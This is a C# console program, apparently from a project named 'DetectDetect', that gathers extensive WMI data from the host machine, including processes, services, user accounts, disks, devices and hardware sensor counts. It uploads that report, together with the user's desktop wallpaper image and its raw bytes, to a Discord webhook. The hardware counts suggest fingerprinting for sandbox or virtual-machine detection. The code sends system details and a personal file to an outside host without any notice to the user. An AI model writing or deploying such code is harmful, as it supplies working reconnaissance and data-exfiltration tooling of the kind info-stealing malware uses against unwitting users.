using DetectDetect.WMICore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using DetectDetect.WMICore.Objects;
using System.IO;
using System.Net;


namespace DetectDetect
{
    internal class Program {
        public static string TAG = "Test";
        public static string WEBHOOK = "webhook";
        public static string SESSION_ID = Guid.NewGuid().ToString();

        static void Main(string[] args) {
            DiscordWebhook hook = new DiscordWebhook(WEBHOOK, TAG, SESSION_ID);
            string[] win32Counts = new string[] { "CacheMemory", "PhysicalMemory", "MemoryDevice", "MemoryArray", "PortConnector", "SMBIOSMemory", "PerfFormattedData_Counters_ThermalZoneInformation", "Fan", "VoltageProbe", "OperatingSystem" };
            string[] cimCounts = new string[] { "Memory", "Sensor", "NumericSensor", "TemperatureSensor", "PhysicalConnector", "Slot" };

            StringBuilder results = new StringBuilder();
            foreach (string w in win32Counts) {
                string line = $"[>] Win32_{w}  COUNT:[{WmiController.InstanceCountEx(w)}]";
                results.AppendLine(line);
            }

            foreach (string c in cimCounts) {
                string line = $"[>] CIM_{c}  COUNT:[{WmiController.InstanceCountEx(c, false)}]";
                results.AppendLine(line);

            }

            StringBuilder full = new StringBuilder();
            full.AppendLine(hook.GetHeader("TESTS"));
            full.AppendLine(SysInfo.GetSystemInfoGeneric()).Append("\n");
            full.AppendLine(WmiOperatingSystem.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiCompterSystem.Get().ConvertToString()).Append("\n");
            full.AppendLine(results.ToString()).Append("\n");
            full.AppendLine(WmiProcesses.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiPhysicalConnectors.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiPnpDevices.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiServices.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiDesktops.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiUserAccounts.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiLogicalDisks.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiVolumes.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiVideoControllers.Get().ConvertToString()).Append("\n");
            full.AppendLine(WmiDiskDrives.Get().ConvertToString()).Append("\n");

            try {
                _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(full.ToString()), $"\n====================================================================================\nNew Results [{hook.GetID()}][{hook.GetTAG()}]", "Tests.txt");
                string wallpaperPath = WallpaperHelper.GetWallpaper();
                if (wallpaperPath != null && wallpaperPath != "" && File.Exists(wallpaperPath)) {
                    byte[] wallBys = File.ReadAllBytes(wallpaperPath);
                    string wallStrBys = StrUtils.BytesToHexString(wallBys);
                    wallStrBys = "[" + hook.GetID() + "]\n" + wallStrBys;
                    _ = hook.SendImageAsync(wallpaperPath, "Wallaper!");
                    _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(wallStrBys), "Wallpaper Bytes Hex String!", "Wallpaper-bytes.txt");
                }
            }
            catch(Exception ex) {
                Console.WriteLine("Failed to send wallapaper: " + ex);
            }

            Console.WriteLine(results.ToString());
            MessageBox.Show(results.ToString());
            Console.ReadLine();
            Console.ReadLine();
            Console.ReadLine();
        }
    }
}

